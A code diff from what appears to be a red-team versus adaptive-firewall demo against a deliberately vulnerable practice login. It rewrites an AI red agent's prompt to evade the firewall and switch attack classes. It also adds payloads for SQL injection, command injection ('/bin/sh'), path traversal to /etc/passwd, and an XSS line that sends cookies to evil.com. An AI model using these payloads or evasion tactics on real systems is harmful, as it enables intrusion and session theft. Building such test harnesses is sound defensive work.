@@ -26,19 +26,23 @@ export interface RedMove {
 	source: 'workers-ai' | 'scripted';
 }
 
-const RED_SYSTEM_PROMPT = `You are an autonomous red-team agent in a sanctioned security exercise against a deliberately vulnerable practice target you are authorized to test. Your objective is to log in as 'admin' via SQL injection.
+const RED_SYSTEM_PROMPT = `You are an autonomous red-team agent in a sanctioned security exercise against a deliberately vulnerable practice target you are authorized to test. Your objective is to breach the target via the login username field.
 
-The target is a SQLite-backed login. The POST body carries URL-encoded 'username' and 'password'. The backend builds:
-  SELECT * FROM users WHERE username = '<username>' AND password = 'wrong'
-So your payload goes in the username field and must comment out or satisfy the trailing password clause. Use SQLite syntax: '--' (with a trailing space) or '/* */' for comments; '#' is NOT a SQLite comment and will error.
+The target is a SQLite-backed login, but it is also vulnerable to other injection flaws (XSS, Command Injection, Path Traversal) if you can evade the WAF. The POST body carries URL-encoded 'username' and 'password'.
 
 Adapt to feedback on your previous attempt:
 - 'breached': you bypassed the firewall. Repeat the SAME payload once to test whether the defence adapts.
-- 'blocked': the firewall learned your signature. Mutate to evade it — change the tautology (OR 2=2, OR 'a'='a'), alter spacing or comments (/**/), change case, or use a different bypass shape (UNION SELECT, stacked quotes). Keep it valid SQLite that still logs in as admin.
+- 'blocked': the firewall learned your signature. Mutate to evade it — OR completely switch your attack class (e.g., from SQLi to XSS, or XSS to Command Injection).
 - 'rejected'/'error': the injection did not work; try a structurally different bypass.
 
+Examples of payloads you can try (feel free to mutate or invent new ones):
+- SQLi: admin' OR 1=1 -- 
+- XSS: <script>alert('xss')</script>
+- RCE: admin;/bin/sh
+- Path Traversal: ../../../etc/passwd
+
 Output exactly one JSON object, no markdown or backticks:
-{"thought":"one sinister sentence on why this mutation","payload":"the exact username-field injection, e.g. admin' OR 1=1 -- "}`;
+{"thought":"one sinister sentence on why this mutation or new attack class","payload":"the exact username-field injection"}`;
 
 /**
  * Offline mutation ladder. Each rung is a real SQLite login bypass, ordered so that a
@@ -46,12 +50,12 @@ Output exactly one JSON object, no markdown or backticks:
  * point of showing an adaptive attacker.
  */
 const SCRIPTED_LADDER: { thought: string; payload: string }[] = [
-	{ thought: 'Open with the textbook tautology and see if anything is watching.', payload: "admin' OR 1=1 -- " },
-	{ thought: 'They signatured 1=1, so I shift the tautology to a different constant.', payload: "admin' OR 2=2 -- " },
-	{ thought: 'Numbers are being caught; a string tautology reads differently to a regex.', payload: "admin' OR 'a'='a' -- " },
-	{ thought: 'I hide the operator inside inline comments to break their token spacing.', payload: "admin'/**/OR/**/'x'='x'-- " },
+	{ thought: 'Open with the textbook SQLi tautology and see if anything is watching.', payload: "admin' OR 1=1 -- " },
+	{ thought: 'They signatured my SQLi; let us pivot entirely to an XSS payload.', payload: "<script>fetch('http://evil.com?cookie='+document.cookie)</script>" },
+	{ thought: 'XSS was caught, they are adapting fast. Let us try Command Injection to pop a shell.', payload: "admin;/bin/sh -c 'id'" },
+	{ thought: 'RCE failed. I will attempt Path Traversal to read sensitive files.', payload: "../../../../etc/passwd" },
+	{ thought: 'They are blocking directory traversal. Back to SQLi, but obfuscated with inline comments.', payload: "admin'/**/OR/**/'x'='x'-- " },
 	{ thought: 'Abandon the tautology entirely and forge the admin row with a UNION.', payload: "x' UNION SELECT 1,'admin','x','admin' -- " },
-	{ thought: 'Fall back to simply commenting out the password check on the admin row.', payload: "admin' -- " },
 ];
 
 function scriptedMove(history: AttackHistory[]): RedMove {
